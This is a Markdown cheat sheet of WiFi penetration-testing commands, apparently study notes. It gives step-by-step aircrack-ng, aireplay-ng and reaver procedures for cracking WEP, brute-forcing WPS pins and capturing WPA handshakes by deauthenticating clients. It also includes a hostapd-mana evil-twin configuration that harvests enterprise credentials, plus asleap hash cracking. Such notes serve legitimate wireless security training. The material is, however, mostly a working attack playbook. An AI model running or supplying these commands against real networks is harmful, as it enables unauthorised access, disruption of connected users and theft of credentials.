# Commands

# WiFi Bands

- a, only 5 GHz -> seems like scanning with airodump on band a can pick up 2.4 GHz APs too
- b, g, only 2.4 GHz
- n, both 5 and 2.4 GHz
- ac, frequencies lower than 6 GHz

# Setup

## List Wireless Interfaces/USB

```bash
sudo lsusb -vv

iwconfig
#or
iw dev
```

## Wireless Card MAC Address

```bash
macchanger -s <INTERFACE>
```

## Listing APs within range

```bash
sudo iw dev <INTERFACE> scan | grep SSID

sudo iw dev <INTERFACE> scan | egrep "DS\ Parameter\ set|SSID:"
```

## Monitor Mode

```bash
sudo airmon-ng

sudo airmon-ng check kill

sudo airmon-ng start wlan0
```

---

# Aircrack Suite

## Airodump-ng

```bash
# specify the channel to sniff
airodump-ng -c <channel> --bssid <bssid>

# sniff a single bssid and output to file
airodump-ng -c <channel> --bssid <bssid> -w <file name>

# sniff both 2.4 and 5 GHz 
airodump-ng wlan0 --band abg

# show WPS status for WPA networks
airodump-ng wlan0 --wps
```

## Aireplay-ng

```bash
# deauth every client connected to a BSSID
sudo aireplay-ng --deauth <no. deauth frames> -a <bssid> wlan0mon

# deauth a singular client
sudo aireplay-ng --deauth <no. deauth frames> -a <bssid> -c <client_MAC> wlan0mon
```

## Aircrack-ng

```bash
# benchmark
sudo aircrack-ng -S  

# no dictionary needed for WEP cracking, just need enough IVs
sudo aircrack-ng wep.cap

# crack a handshake saved in a cap file:
sudo aircrack-ng -w <wordlist> -e <ESSID> -b <AP BSSID> file.pcap
sudo aircrack-ng -w /usr/share/john/password.lst -e <ESSID> -b <ap bssid> file.cap

# crack with airolib DB (precomputed PMKs)
sudo aircrack-ng -r wifu.sqlite wpa1-01.cap
```

# Cracking

## WEP with Connected Clients

1. Force leakage of IVs with:
    1. Fake Authentication
    2. ARP Request Replay Attack
    3. Deauthentication Attack

```bash
# packet capture
sudo airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# retrieve MAC address
macchanger --show <INTERFACE>

# fake authentication attack
sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# ARP request replay attack
sudo aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

# deauthentication attack
sudo aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# crack once we have significant number of IVs
aircrack-ng <CAPTURE_NAME>
aircrack-ng -f <FUDGE> <CAPTURE_NAME>
```

## WEP via Client

1. Make use of connected client to perform Interactive Replay Attack

```bash
# packet capture
sudo airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# retrieve MAC address
macchanger --show <INTERFACE>

# fake authentication attack
sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# interactive packet replay attack
sudo aireplay-ng -2 -b <BSSID> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <INTERFACE>

# crack 
aircrack-ng <CAPTURE_NAME>
```

## WEP without Clients

Fragmentation Attack

```bash
# packet capture
sudo airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# retrieve MAC address
macchanger --show <INTERFACE>

# fake authentication attack
sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# fragmentation attack
sudo aireplay-ng -5 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

# forging ARP packet with the XOR packet from fragmentation attack
packetforge-ng -0 -a <BSSID> -h <YOUR_MAC> -k 255.255.255.255 -l 255.255.255.255 -y <FRAGMENT_PACKET>.xor -w <ARP_PACKET_NAME>

# interactive packet replay attack with the forge ARP packet
sudo aireplay-ng -2 -r <ARP_PACKET_NAME> <INTERFACE>

# crack 
aircrack-ng <CAPTURE_NAME>
```

KoreK Chop Chop Attack

```bash
# packet capture
sudo airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# retrieve MAC address
macchanger --show <INTERFACE>

# fake authentication attack
sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# chop chop attack
sudo aireplay-ng -4 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

# forging ARP packet with the XOR packet from chop chop attack 
packetforge-ng -0 -a <BSSID> -h <YOUR_MAC> -k 255.255.255.255 -l 255.255.255.255 -y <CHOP_CHOP_PACKET>.xor -w <ARP_PACKET_NAME>

# interactive packet replay attack with the forge ARP packet
sudo aireplay-ng -2 -r <ARP_PACKET_NAME> <INTERFACE>

# crack 
aircrack-ng <CAPTURE_NAME>
```

## WEP - Shared Key Authentication

```bash
# packet capture
sudo airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# retrieve MAC address
macchanger --show <INTERFACE>

# fake authentication attack (should fail)
sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# deauthentication attack (if there is client)
sudo aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# fake shared key authentication using the XOR keystream
sudo aireplay-ng -1 60 -e <ESSID> -y wepshared-<NAME>.xor -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# ARP replay attack
sudo aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

# deauthentication attack (if there is client)
sudo aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# crack 
aircrack-ng <CAPTURE_NAME>
```

## WPS

1. Identify AP with WPS
2. Bruteforce WPS pin

```bash
# identify APs using WPS
wash -i wlan0
# 5GHz
wash -i wlan0 -5

# PixieWPS attack
sudo reaver -c <channel> -b <BSSID> -i wlan0 -vvv -K

# bruteforce WPS pin
sudo reaver -c <channel> -b <BSSID> -i wlan0 -vvv
```

## WPA/WPA2 - PSK

1. Recon and identify AP
2. Zoom in to AP and capture to file
3. Deauthentication attack to force 4-way handshake
4. Crack

```bash
# listen for handshake and capture to file
sudo airodump-ng --bssid <AP bssid> -c <channel> -w <cap file> wlan0

# deauth every client connected to a BSSID
sudo aireplay-ng --deauth <no. deauth frames> -a <bssid> wlan0mon
# deauth a singular client
sudo aireplay-ng --deauth <no. deauth frames> -a <bssid> -c <client_MAC> wlan0mon

# Crack the capture file
aircrack-ng <file.cap> -w <wordlist.txt>
```

## WPA/WPA2 - Enterprise

[https://github.com/dh0ck/Wi-Fi-Pentesting-Cheatsheet/blob/main/Wifi/cheatsheet/6 - WPA enterprise.md](https://github.com/dh0ck/Wi-Fi-Pentesting-Cheatsheet/blob/main/Wifi/cheatsheet/6%20-%20WPA%20enterprise.md)

1. Fake AP with RADIUS for authentication
    - Modify [certificate_authority] in ca.cnf and [server] server.cnf to match what is used by the current AP
    - Generate certificates
        
        ```bash
        # in /etc/freeradius/3.0/certs
        rm dh
        make
        ```
        
    - Create `/etc/hostapd-mana/mana.eap_user`
        
        ```bash
        *     PEAP,TTLS,TLS,FAST
        "t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
        ```
        
    - Create `mana.conf` for “evil twin”
        
        ```
        ssid=<ESSID>
        
        interface=wlan0
        driver=nl80211
        
        channel=1
        hw_mode=g
        
        ieee8021x=1
        eap_server=1
        
        eapol_key_index_workaround=0
        
        eap_user_file=/etc/hostapd-mana/mana.eap_user
        
        ca_cert=/etc/freeradius/3.0/certs/ca.pem
        server_cert=/etc/freeradius/3.0/certs/server.pem
        private_key=/etc/freeradius/3.0/certs/server.key
        private_key_passwd=whatever
        dh_file=/etc/freeradius/3.0/certs/dh
        
        auth_algs=1
        wpa=3
        wpa_key_mgmt=WPA-EAP
        wpa_pairwise=CCMP TKIP
        
        mana_wpe=1
        mana_credout=/tmp/hostapd.credout
        
        mana_eapsuccess=1
        mana_eaptls=1
        ```
        
2. Capture hash of clients attempting to connect
3. Crack hash
    
    ```bash
    asleap -C <mschapv2_challenge> -R <mschapv2_response> -W <wordlist>
    ```
    

---

# Connecting to Network

Refer to the subsequent sections for the necessary wpa_supplicant conf files.

```bash
# we need to stop monitor mode and switch to managed mode
sudo airmon-ng stop wlan0
# next we need to start NetworkManager
sudo systemctl start NetworkManager.service

# or ensure wpa_supplicant is down first then run the following command
sudo wpa_supplicant -D nl80211 -i wlan0 -c <conf file name> 
# -B = background
# -D = driver (it is normally nl80211)
# -i = interface
# -c = conf file
sudo dhclient -v wlan0
```

## WEP

```
network={
  ssid="<ESSID>"
  key_mgmt=NONE
  wep_key0="<password>"
  wep_tx_keyidx=0
}
```

## WPA/WPA2-PSK

```
network={
  ssid="<ESSID>"
  scan_ssid=1
  psk="<passphrase>"
  key_mgmt=WPA-PSK
}
```

WPA2-PSK only:

```
network={
  ssid="<ESSID>"
  key_mgmt=WPA_PSK
  psk="<passphrase>"
  proto=RSN
  pairwise=CCMP
  group=CCMP
}

# less specific, can work better
network={
  ssid="<ESSID>"
  key_mgmt=WPA_PSK
  psk="<passphrase>"
  proto=RSN
}
```

## WPA-Enterprise

PEAP-MSCHAPv2:

```
network={
  ssid="<ESSID>"
  scan_ssid=1
  key_mgmt=WPA-EAP
  eap=PEAP
  identity="bob"
  password="hello"
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}
```

PEAP-GTC:

```
network={
  ssid="<ESSID>"
  scan_ssid=1
  key_mgmt=WPA-EAP
  eap=PEAP
  identity="bob"
  password="hello"
  phase1="peaplabel=0"
  phase2="auth=GTC"
}
```

TTLS-PAP:

```
network={
  ssid="<ESSID>"
  scan_ssid=1
  key_mgmt=WPA-EAP
  eap=TTLS
  identity="bob"
  anonymous_identity="anon"
  password="hello"
  phase2="auth=PAP"
}
```

TTLS-CHAP:

```
network={
  ssid="<ESSID>"
  scan_ssid=1
  key_mgmt=WPA-EAP
  eap=TTLS
  identity="bob"
  anonymous_identity="anon"
  password="hello"
  phase2="auth=CHAP"
}
```

TTLS-MSCHAPv2:

```
network={
  ssid="<ESSID>"
  scan_ssid=1
  key_mgmt=WPA-EAP
  eap=TTLS
  identity="bob"
  anonymous_identity="anon"
  password="hello"
  phase2="auth=MSCHAPV2"
}
```

---